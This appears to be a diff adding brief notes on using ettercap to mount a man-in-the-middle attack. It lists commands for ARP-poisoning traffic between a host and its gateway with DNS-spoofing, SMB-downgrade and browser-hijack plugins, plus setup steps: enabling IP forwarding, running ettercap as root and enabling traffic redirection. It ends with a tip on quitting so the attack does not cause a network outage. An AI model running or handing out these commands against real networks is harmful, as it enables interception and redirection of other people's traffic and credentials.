@@ -1,0 +1,21 @@
+ettercap -M arp:remote
+the "arp:remote" specifies the type of MITM attack (arp posioning and sniff remote connections)
+
+ettercap -T -M arp:remote /host/ /gateway/ -P dns_spoof -P smb_down -P autoadd -P remote_browser
+
+
+
+**************************************************************************
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+1, to edit the /etc/etter.conf
+ec_uid = 0
+ec_gid = 0
+
+2, remove the # from the redir_command_on and redir_command_off
+
+3, remote_browser = "firefox -remote openurl(http://%host%url)"
+
+quiting ettercap press "q" key not ctrl+c.
+
+When quiting ettercap, make sure to press the letter "q", instead of the typical "Ctrl+C", because that will Re-ARP all the clients, If you simply press "Ctrl+C", then there will be a massive DoS, and no clients will have the internet or network access until they refresh their network position.
